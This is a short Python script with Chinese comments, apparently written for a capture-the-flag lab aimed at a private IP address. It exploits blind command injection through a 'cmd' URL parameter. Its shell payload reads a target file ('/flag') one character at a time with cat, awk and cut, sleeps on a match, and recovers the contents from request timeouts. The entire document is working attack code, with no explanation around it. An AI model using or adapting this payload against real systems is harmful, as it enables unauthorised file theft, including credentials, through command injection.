from multiprocessing.shared_memory import ShareableList
import requests
import time

url = "http://192.168.122.128:18080/class08/1.php"  # 输入网址
line = 10  # 输入行数,大小靠猜
crow = 100  # 输入列数,大小靠猜
arg = "cmd"  # 输入传参参数名
name = "/flag"  # 输入读取文件的绝对路径或想对路径

result = ""
for i in range(1, line):
    for j in range(1, crow):
        for k in range(32, 128):  # 32~128把可见ascii包括完辣
            k = chr(k)
            # time.sleep(0.1)
            payload = "?" + arg + f"=if [ `cat {name} | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"  # f表示格式化字符串
            try:
                requests.get(url=url + payload,
                             timeout=(1.5, 1.5))  # 直接用timeout=1.5表示完成请求限时1.5秒,这样写表示发送到服务器限时1.5秒,服务器响应限时1.5秒,总限时3秒
            except:
                result = result + k
                print(result)
                break
    result += " "